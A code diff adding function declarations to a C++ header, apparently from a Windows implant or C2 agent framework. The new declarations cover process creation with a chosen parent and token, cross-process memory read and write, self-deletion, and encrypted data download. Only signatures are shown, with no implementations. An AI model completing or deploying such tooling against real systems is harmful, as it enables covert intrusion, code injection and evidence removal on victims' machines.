@@ -70,10 +70,12 @@ namespace System::Priv
 
 namespace System::Process
 {
-    HANDLE ProcessCreate(
+   HANDLE ProcessCreate(
         Procs::PPROCS   pProcs,
-        LPCWSTR         lpApplicationName,
+        LPCWSTR 		lpApplicationName,
         DWORD           dwDesiredAccess,
+        BOOL			bInheritHandles,
+        DWORD           dwCreationFlags,
         HANDLE          hParentProcess,
         HANDLE          hToken
     );
@@ -95,9 +97,18 @@ namespace System::Process
     PVOID VirtualMemoryAllocate(
         Procs::PPROCS   pProcs,
         HANDLE          hProcess,
+        PVOID	        pBaseAddr,
         SIZE_T          dwSize,
         DWORD           dwAllocationType,
         DWORD           dwProtect
+    );
+    BOOL VirtualMemoryRead(
+        Procs::PPROCS   pProcs,
+		HANDLE			hProcess,
+		PVOID			pBaseAddr,
+		PVOID			pBuffer,
+		SIZE_T			dwBufferSize,
+		PSIZE_T			lpNumberOfBytesRead
     );
     BOOL VirtualMemoryWrite(
         Procs::PPROCS   pProcs,
@@ -193,6 +204,9 @@ namespace System::Fs
         Procs::PPROCS   pProcs,
         HANDLE          hFile
     );
+    BOOL SelfDelete(
+        Procs::PPROCS pProcs
+    );
 }
 
 namespace System::Http
@@ -227,6 +241,16 @@ namespace System::Http
         Procs::PPROCS   pProcs,
         HINTERNET       hRequest
     );
+    std::vector<BYTE> DataDownload(
+		Procs::PPROCS pProcs,
+		Crypt::PCRYPT pCrypt,
+		HINTERNET hConnect,
+		LPCWSTR lpHost,
+		INTERNET_PORT nPort,
+		LPCWSTR lpPath,
+		LPCWSTR lpHeaders,
+		const std::wstring& wSrc
+	);
     BOOL FileDownload(
         Procs::PPROCS       pProcs,
         Crypt::PCRYPT       pCrypt,
